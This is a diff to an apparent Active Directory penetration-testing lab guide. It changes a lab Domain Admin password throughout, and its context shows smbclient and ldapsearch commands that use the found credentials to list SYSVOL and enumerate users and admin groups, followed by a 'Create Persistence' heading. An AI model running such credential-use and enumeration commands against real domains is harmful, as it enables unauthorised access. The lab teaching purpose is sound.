@@ -358,7 +358,7 @@ cat passwords.txt
 
 **CRITICAL FINDING:** You've discovered:
 ```
-Domain Admin (emergency): Adm1n2024!
+Domain Admin (emergency): Adm1n2024
 ```
 
 **Why this matters:** You now have the Domain Administrator password. But let's explore another attack path that would work even without finding this file.
@@ -473,17 +473,17 @@ Instead, verify your Domain Admin access via SMB:
 
 ```bash
 # List shares on the Domain Controller with Domain Admin credentials
-smbclient -L //172.16.2.12 -U 'Administrator%Adm1n2024!'
+smbclient -L //172.16.2.12 -U 'Administrator%Adm1n2024'
 
 # Access the SYSVOL share (only Domain Admins can write here)
-smbclient //172.16.2.12/sysvol -U 'Administrator%Adm1n2024!' -c 'ls'
+smbclient //172.16.2.12/sysvol -U 'Administrator%Adm1n2024' -c 'ls'
 ```
 
 You can also verify via LDAP:
 ```bash
 # Query domain users as Domain Admin
 ldapsearch -x -H ldap://172.16.2.12 -D "cn=Administrator,cn=Users,DC=acmewidgets,DC=local" \
-  -w 'Adm1n2024!' -b 'DC=acmewidgets,DC=local' '(objectClass=user)' cn -ZZ
+  -w 'Adm1n2024' -b 'DC=acmewidgets,DC=local' '(objectClass=user)' cn -ZZ
 ```
 
 **You now have Domain Admin access!**
@@ -504,10 +504,10 @@ Since this is a Samba-based AD (Linux), we verify access via SMB and LDAP rather
 
 ```bash
 # Verify you can access privileged shares
-smbclient //172.16.2.12/sysvol -U 'Administrator%Adm1n2024!' -c 'ls'
+smbclient //172.16.2.12/sysvol -U 'Administrator%Adm1n2024' -c 'ls'
 
 # List all files in the domain SYSVOL
-smbclient //172.16.2.12/sysvol -U 'Administrator%Adm1n2024!' -c 'recurse; ls'
+smbclient //172.16.2.12/sysvol -U 'Administrator%Adm1n2024' -c 'recurse; ls'
 ```
 
 ### 6.2 Explore the Domain
@@ -518,11 +518,11 @@ Use LDAP or Samba tools to enumerate the domain:
 # List all domain users (via samba-tool if you have shell access)
 # Or enumerate via LDAP from Kali:
 ldapsearch -x -H ldap://172.16.2.12 -D "cn=Administrator,cn=Users,DC=acmewidgets,DC=local" \
-  -w 'Adm1n2024!' -b 'cn=Users,DC=acmewidgets,DC=local' '(objectClass=user)' sAMAccountName -ZZ
+  -w 'Adm1n2024' -b 'cn=Users,DC=acmewidgets,DC=local' '(objectClass=user)' sAMAccountName -ZZ
 
 # Check group memberships
 ldapsearch -x -H ldap://172.16.2.12 -D "cn=Administrator,cn=Users,DC=acmewidgets,DC=local" \
-  -w 'Adm1n2024!' -b 'DC=acmewidgets,DC=local' '(cn=Domain Admins)' member -ZZ
+  -w 'Adm1n2024' -b 'DC=acmewidgets,DC=local' '(cn=Domain Admins)' member -ZZ
 ```
 
 ### 6.3 Create Persistence (For Education Only)
